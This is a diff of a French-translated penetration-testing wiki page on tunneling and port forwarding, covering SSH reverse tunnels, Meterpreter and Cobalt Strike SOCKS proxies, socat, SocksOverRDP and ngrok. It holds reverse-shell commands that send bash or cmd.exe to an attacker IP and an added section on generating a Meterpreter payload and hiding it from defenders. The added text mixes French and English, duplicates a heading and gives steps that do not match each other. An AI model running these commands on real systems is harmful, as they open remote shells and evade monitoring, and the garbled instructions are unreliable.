@@ -14,7 +14,7 @@
 
 **Groupe de sécurité Try Hard**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -85,7 +85,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # and change the line "GatewayPorts no" to "GatewayPorts yes"
 # to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
 ```
-### VPN-Tunnel
+### Tunnel VPN
 
 Vous avez besoin de **root sur les deux appareils** (car vous allez créer de nouvelles interfaces) et la configuration de sshd doit autoriser la connexion en tant que root :\
 `PermitRootLogin yes`\
@@ -130,7 +130,7 @@ portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
 ```
 ### SOCKS
 
-### SOCKS
+SOCKS (Socket Secure) est un protocole de tunneling qui permet de transférer des données à travers un réseau de manière sécurisée. Il peut être utilisé pour contourner les pare-feu et les restrictions de réseau, ainsi que pour masquer l'adresse IP de l'utilisateur.
 ```bash
 background# meterpreter session
 route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
@@ -144,11 +144,11 @@ Tunneling is a method that allows data to be transferred securely over a public 
 
 #### Tunneling
 
-Tunneling can be used to bypass firewalls and access restricted networks. It creates a secure connection between the source and destination by encapsulating the data in a different protocol. This allows data to travel through unsecured networks as if it were traveling through a private network.
+Tunneling can be used to bypass firewalls and access restricted networks. It creates a secure path for data to travel between two endpoints by encapsulating the data in an outer packet. This outer packet is then transmitted over the network, protecting the inner data from being intercepted.
 
 #### Port Forwarding
 
-Port forwarding is commonly used in NAT (Network Address Translation) environments to allow external devices to access services on private networks. It works by redirecting traffic from a specific port on a router to a specific internal IP address and port. This enables external users to access services hosted on devices within the private network.
+Port forwarding is commonly used in NAT (Network Address Translation) environments to allow external devices to access services on private networks. It works by mapping a port on the gateway router to a specific internal IP address and port. This way, incoming traffic on the specified port is forwarded to the correct destination within the private network.
 
 Both tunneling and port forwarding are essential techniques in networking and cybersecurity for ensuring secure and efficient data transmission.
 ```bash
@@ -163,7 +163,7 @@ set VERSION 4a
 run #Proxy port 1080 by default
 echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 ```
-## Cobalt Strike
+### Cobalt Strike
 
 ### Proxy SOCKS
 
@@ -184,10 +184,16 @@ Dans ce cas, le **port est ouvert dans l'hôte du beacon**, pas dans le Serveur 
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
+Pour noter :
+
+- Le renvoi de port inverse de Beacon est conçu pour **tunneliser le trafic vers le serveur d'équipe, et non pour relayer entre des machines individuelles**.
+- Le trafic est **tunnelisé dans le trafic C2 de Beacon**, y compris les liens P2P.
+- **Les privilèges d'administrateur ne sont pas nécessaires** pour créer des renvois de port inverse sur des ports élevés.
+
 ### rPort2Port local
 
 {% hint style="warning" %}
-Dans ce cas, le **port est ouvert dans l'hôte du beacon**, pas dans le Serveur d'Équipe et le **trafic est envoyé au client Cobalt Strike** (pas au Serveur d'Équipe) et de là vers l'hôte:port indiqué.
+Dans ce cas, le **port est ouvert dans l'hôte de Beacon**, et non dans le serveur d'équipe, et le **trafic est envoyé au client Cobalt Strike** (et non au serveur d'équipe) et de là à l'hôte:port indiqué.
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -257,13 +263,7 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
 ### Port2Port
 
-#### Port Forwarding
-
-Port forwarding is a technique used to allow external devices to access services on a private network. It involves forwarding network traffic from one network port to another. This can be useful for accessing services on a remote network or for exposing a local server to the internet.
-
-#### Tunneling
-
-Tunneling is a method used to transfer data securely across networks. It involves encapsulating the data in an additional layer of security protocols, allowing it to pass through networks that may have restrictions or security measures in place. Tunneling can be used to bypass firewalls, access restricted content, or secure communications over untrusted networks.
+### Port2Port
 ```bash
 socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```
@@ -272,6 +272,38 @@ socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
 ### Meterpreter via SSL Socat
+
+#### Introduction
+
+Socat is a versatile networking tool that allows creating bidirectional data streams between two endpoints. In this case, we will use Socat to establish a secure communication channel for Meterpreter sessions by tunneling the traffic over SSL.
+
+#### Steps
+
+1. **Set up a listener on the attacker machine:**
+
+   ```bash
+   socat openssl-listen:443,reuseaddr,fork,cert=server.pem,verify=0 -
+   ```
+
+2. **Set up the payload with the SSL certificate:**
+
+   ```bash
+   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f exe > meterpreter.exe
+   ```
+
+3. **Execute the payload on the target machine:**
+
+   ```bash
+   socat exec:'cmd.exe',pipes,stderr,setsid,sigint,sane openssl:<attacker_ip>:443,verify=0
+   ```
+
+4. **Interact with the Meterpreter session:**
+
+   Once the payload is executed on the target machine, you should receive a Meterpreter session on your listener.
+
+#### Conclusion
+
+Using Socat to tunnel Meterpreter traffic over SSL adds an extra layer of security to your communication channel, making it harder for network defenders to detect and block your activities.
 ```bash
 #Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
 attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
@@ -339,9 +371,9 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ## SocksOverRDP & Proxifier
 
 Vous devez avoir **un accès RDP sur le système**.\
-Téléchargement :
+Téléchargez :
 
-1. [Binaires SocksOverRDP x64](https://github.com/nccgroup/SocksOverRDP/releases) - Cet outil utilise les `Dynamic Virtual Channels` (`DVC`) de la fonctionnalité Remote Desktop Service de Windows. DVC est responsable du **tunneling des paquets sur la connexion RDP**.
+1. [Binaires SocksOverRDP x64](https://github.com/nccgroup/SocksOverRDP/releases) - Cet outil utilise les `Canaux Virtuels Dynamiques` (`DVC`) de la fonctionnalité de Service de Bureau à distance de Windows. DVC est responsable du **tunneling des paquets sur la connexion RDP**.
 2. [Binaire Portable Proxifier](https://www.proxifier.com/download/#win-tab)
 
 Chargez **`SocksOverRDP-Plugin.dll`** sur votre ordinateur client comme ceci :
@@ -349,13 +381,13 @@ Chargez **`SocksOverRDP-Plugin.dll`** sur votre ordinateur client comme ceci :
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Maintenant, nous pouvons **se connecter** à la **victime** via **RDP** en utilisant **`mstsc.exe`**, et nous devrions recevoir un **message** indiquant que le plugin **SocksOverRDP est activé**, et qu'il va **écouter** sur **127.0.0.1:1080**.
+Maintenant, nous pouvons **se connecter** à la **victime** via **RDP** en utilisant **`mstsc.exe`**, et nous devrions recevoir un **message** indiquant que le **plugin SocksOverRDP est activé**, et qu'il va **écouter** sur **127.0.0.1:1080**.
 
 **Connectez-vous** via **RDP** et téléchargez et exécutez sur la machine de la victime le binaire `SocksOverRDP-Server.exe` :
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-Maintenant, confirmez sur votre machine (attaquant) que le port 1080 écoute :
+Maintenant, confirmez sur votre machine (attaquant) que le port 1080 est en écoute :
 ```
 netstat -antb | findstr 1080
 ```
@@ -379,7 +411,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
 Il s'authentifie contre un proxy et lie un port localement qui est redirigé vers le service externe que vous spécifiez. Ensuite, vous pouvez utiliser l'outil de votre choix via ce port.\
-Par exemple, rediriger le port 443.
+Par exemple, pour rediriger le port 443
 ```
 Username Alice
 Password P@ssw0rd
@@ -392,7 +424,7 @@ Vous pourriez également utiliser un **meterpreter** qui se connecte à localhos
 
 ## YARP
 
-Un proxy inverse créé par Microsoft. Vous pouvez le trouver ici: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
+Un proxy inversé créé par Microsoft. Vous pouvez le trouver ici: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
 
 ## Tunnel DNS
 
@@ -437,7 +469,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Changer le DNS de proxychains
 
-Proxychains intercepte l'appel libc `gethostbyname` et tunnelise les requêtes DNS tcp à travers le proxy socks. Par **défaut**, le serveur **DNS** utilisé par proxychains est **4.2.2.2** (en dur). Pour le changer, éditez le fichier : _/usr/lib/proxychains3/proxyresolv_ et modifiez l'IP. Si vous êtes dans un environnement **Windows**, vous pouvez définir l'IP du **contrôleur de domaine**.
+Proxychains intercepte l'appel libc `gethostbyname` et tunnelise la requête DNS tcp à travers le proxy socks. Par **défaut**, le serveur **DNS** utilisé par proxychains est **4.2.2.2** (en dur). Pour le changer, éditez le fichier : _/usr/lib/proxychains3/proxyresolv_ et modifiez l'IP. Si vous êtes dans un environnement **Windows**, vous pouvez définir l'IP du **contrôleur de domaine**.
 
 ## Tunnels en Go
 
@@ -475,7 +507,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 **[ngrok](https://ngrok.com/) est un outil pour exposer des solutions sur Internet en une seule ligne de commande.**
-*Les URI d'exposition ressemblent à:* **UID.ngrok.io**
+*Les URI d'exposition sont du type:* **UID.ngrok.io**
 
 ### Installation
 
@@ -491,7 +523,7 @@ chmod a+x ./ngrok
 
 **Documentation:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-*Il est également possible d'ajouter une authentification et TLS, si nécessaire.*
+*Il est également possible d'ajouter une authentification et du TLS, si nécessaire.*
 
 #### Tunneling TCP
 ```bash
@@ -506,7 +538,7 @@ chmod a+x ./ngrok
 ./ngrok http file:///tmp/httpbin/
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
 ```
-#### Interception des appels HTTP
+#### Sniffing HTTP calls
 
 *Utiles pour XSS, SSRF, SSTI ...*
 Directement depuis stdout ou dans l'interface HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).
@@ -542,7 +574,7 @@ addr: file:///tmp/httpbin/
 
 **Groupe de sécurité Try Hard**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
